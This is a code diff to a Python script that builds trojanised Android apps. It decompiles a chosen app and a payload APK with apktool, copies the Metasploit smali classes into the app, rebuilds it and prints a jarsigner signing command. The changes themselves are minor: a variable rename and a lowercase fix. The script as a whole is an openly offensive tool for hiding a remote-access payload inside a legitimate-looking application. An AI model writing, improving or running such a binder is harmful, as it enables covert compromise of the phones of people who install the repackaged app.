@@ -28,14 +28,14 @@ else:
     os.system(f'apktool d -f apk/{application}.apk')
     time.sleep(3)
     os.system(f'mv {application} apk')
-payload = input ("\nEnter the payload name => ")
-if payload.lower == 'e' :
+payload0 = input ("\nEnter the payload name => ")
+if payload0.lower == 'e' :
     print('OK')
 else: 
-    os.system(f'apktool d -f apk/{payload}.apk')
-    os.system(f'mv {payload} apk')
+    os.system(f'apktool d -f apk/{payload0}.apk')
+    os.system(f'mv {payload0} apk')
     time.sleep(3)
-    os.system(f'cp -r apk/{payload}/smali/com/metasploit apk/{application}/smali/com/')
+    os.system(f'cp -r apk/{payload0}/smali/com/metasploit apk/{application}/smali/com/')
 no = input("Press n to continue [y/n] => ")
 if no == 'y':
     os.system(f'java -jar apk/apktool_2.9.3.jar b apk/{application}')
@@ -43,7 +43,7 @@ if no == 'y':
     
 else:
     pass
-yes = input ("Press n to continue [y/n] => ")
+yes = input ("Press n to continue [y/n] => ").lower()
 if yes == 'y':
     print(f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk/key.keystore apk/{application}/dist/{application}.apk elliot')
     time.sleep(2)
